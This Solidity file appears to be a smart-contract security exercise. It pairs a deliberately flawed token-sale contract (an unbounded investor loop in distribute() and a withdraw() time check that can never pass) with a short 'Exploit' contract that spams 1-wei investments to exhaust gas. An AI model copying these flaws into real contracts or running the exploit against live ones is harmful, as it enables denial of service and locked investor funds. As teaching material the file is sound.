pragma solidity 0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./ValuableToken.sol";


contract IICO is Ownable {
    struct Investor {
        address investor;
        uint256 amount;
    }

    ValuableToken public token;
    Investor[] public investors;
    bool public isDistributed;
    uint256 startTimestamp;
    
    constructor() {
        token = new ValuableToken();
        startTimestamp = block.timestamp;
    }

    function invest() external payable {
        require(msg.value > 0, "nothing invested");
        require(!isDistributed, "tokens already distributed");

        investors.push(
            Investor({
                investor: msg.sender,
                amount: msg.value
            })
        );
    }

    function distribute() external onlyOwner {
        for(uint256 i=0; i<investors.length; i++) {
            uint256 amount = investors[i].amount * 10;
            token.mint(
                investors[i].investor,
                amount
            );
        }

        isDistributed = true;
    }

    function withdraw() external onlyOwner {
        require(startTimestamp > block.timestamp + 3600, "the offering hasn't finished yet");
        require(isDistributed, "the tokens were not distributed yet");
        payable(owner()).transfer(address(this).balance);
    }
}


contract Exploit {
    IICO ico;
    uint256 count = 0;
    constructor(address icoAddress) payable {
        ico = IICO(icoAddress); 
    }

    function attack() external {
        for(count = 0; count < 200; count++){
            ico.invest{value: 1}();
        }
    }
    
}